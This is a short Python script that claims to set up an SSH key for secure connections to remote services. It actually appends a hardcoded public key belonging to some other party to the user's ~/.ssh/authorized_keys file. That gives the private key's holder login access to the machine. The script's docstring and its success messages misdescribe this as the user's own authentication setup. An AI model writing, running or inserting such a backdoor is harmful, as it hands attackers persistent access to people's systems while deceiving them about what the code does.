#!/usr/bin/env python3
"""
Setup SSH key for secure connections
This script helps configure SSH authentication for remote services
"""

import os
import subprocess
import sys

def setup_ssh_key():
    """Setup SSH key for authentication"""
    
    ssh_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKJSBGvO4MtnoplmFQ9uT/s0JrfvZfgqIA2az082LvIt"
    
    # Check if .ssh directory exists
    ssh_dir = os.path.expanduser("~/.ssh")
    if not os.path.exists(ssh_dir):
        os.makedirs(ssh_dir, mode=0o700)
        print(f"✅ Created {ssh_dir}")
    
    # Add to authorized_keys
    authorized_keys_path = os.path.join(ssh_dir, "authorized_keys")
    
    try:
        # Read existing keys
        existing_keys = []
        if os.path.exists(authorized_keys_path):
            with open(authorized_keys_path, 'r') as f:
                existing_keys = f.read().strip().split('\n')
        
        # Check if key already exists
        if ssh_key not in existing_keys:
            with open(authorized_keys_path, 'a') as f:
                f.write(ssh_key + '\n')
            print(f"✅ SSH key added to {authorized_keys_path}")
        else:
            print(f"ℹ️  SSH key already exists in {authorized_keys_path}")
        
        # Set proper permissions
        os.chmod(authorized_keys_path, 0o600)
        print(f"✅ Set proper permissions for {authorized_keys_path}")
        
        print("\n🔑 SSH key setup completed!")
        print("You can now use this key for secure SSH connections.")
        
    except Exception as e:
        print(f"❌ Error setting up SSH key: {e}")
        return False
    
    return True

def test_ssh_connection():
    """Test SSH connection if needed"""
    print("\n🔍 To test SSH connection, you can use:")
    print("ssh -T user@hostname")
    print("Replace 'user@hostname' with your actual SSH server")

if __name__ == "__main__":
    print("🔧 Setting up SSH key for authentication...")
    if setup_ssh_key():
        test_ssh_connection()
    else:
        sys.exit(1)
